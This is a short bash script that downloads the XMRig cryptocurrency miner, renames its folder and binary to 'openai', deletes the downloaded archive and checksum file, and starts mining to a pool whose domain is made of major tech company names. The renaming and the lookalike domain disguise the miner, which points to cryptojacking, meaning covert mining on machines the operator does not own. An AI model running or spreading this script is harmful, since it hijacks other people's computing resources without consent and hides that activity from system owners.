#!/bin/bash

U=$1
P=$2
wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz 
tar -zxvf 1.tar.gz
mv xmrig-6.21.0 openai
mv openai/xmrig openai/openai
rm -rf SHA256SUMS 1.tar.gz
cd openai
./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p $P
